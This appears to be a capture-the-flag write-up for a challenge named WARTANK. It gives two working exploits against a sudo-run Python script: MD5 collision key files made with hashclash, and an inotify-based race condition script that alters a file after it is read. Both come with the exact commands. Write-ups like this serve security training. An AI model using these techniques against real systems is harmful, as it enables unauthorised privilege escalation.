# WARTANK

## Intended solution

MD5 collisions are required to solve this challenge.
In order to create one, we can use the following tool:

https://github.com/cr-marcstevens/hashclash

To create a collision useful to us (the string `TNKK` must be contained in each of the two files) we can run the following commands:

```shell
echo -n "TNKK" > prefix.txt
../scripts/poc_no.sh prefix.txt
```

Now that we have the two colliding files we can provide them to the `startup.py` executable:


```shell
echo "VE5LS0k2w1B0Lqxb74/E4iQdO+r++yQzfEMEDZRH0zEfyUfkK6m6yuC5Sz0c3/nnVl40dAlEnKLodtbC2ucCJZhUlTVceFA9MnBzLYqFiibpLfW/a0xNN7U9QmFkbeZoBJgNOYYosCyHSElXnfZA56lJFI7/6DsIVKHOfybyLeg=" | base64 -d > /tmp/key1
echo "VE5LS0k2w1B0L6xb74/E4iQdO+r++yQzfEMEDZRH0zEfyUfkK6m6yuC5Sz0c3/nnVl40dAlEnKLodtbC2ucCJZhUlTVceFA9Mm9zLYqFiibpLfW/a0xNN7U9QmFkbeZoBJgNOYYosCyHSElXnfZA56lJFI7/6DsIVKHOfybyLeg=" | base64 -d > /tmp/key2
sudo /usr/bin/python3 /home/wartank/startup.py --key1 /tmp/key1 --key2 /tmp/key2 --action remote_control
```

## Alternative solution
### STEP 1: burp
open burp (or an http proxy in general) on your pc, and make it listen on 8080

### STEP 2: expose burp IN the remote machine
```bash
ssh -R 8080:127.0.0.1:8080 wartank@[MACHINE_IP] -p 2225
```

### STEP 3: expose proxy globally in the remote machine and install pip / inotify
```bash
http_proxy="http://127.0.0.1:8080"
https_proxy="https://127.0.0.1:8080"
cd /dev/shm;
wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py
HOME=/dev/shm
python3 get-pip.py --user --break-system-packages --trusted-host pypi.python.org --trusted-host pypi.org [...] #check the errors and allow 
python3 -m pip install --user --break-system-packages inotify --trusted-host pypi.python.org --trusted-host pypi.org [...]
```

### STEP 4: upload the exploiter
```python
import inotify.adapters

wf = '/dev/shm/test2'

tl = 10*1024*1024
with open('/dev/shm/test1','w')as f:
    f.write("TNKK")
    f.write("A"*tl)
tl -= 1

with open(wf, "w") as f:
    f.write("TNKK")
    f.write("A"*tl)
    f.flush()
    print("READY")
    i = inotify.adapters.Inotify()
    i.add_watch(wf)
    for event in i.event_gen(yield_nones=False):
        (_, type_names, path, filename) = event
        if type_names[0] == 'IN_CLOSE_NOWRITE':
            break
    f.write("A")
    f.flush()
print("DONE")
```

### STEP 5: run the program
```bash
cd /dev/shm
sudo /usr/bin/python3 /home/wartank/startup.py --key1 test1 --key2 test2 --action remote_control
```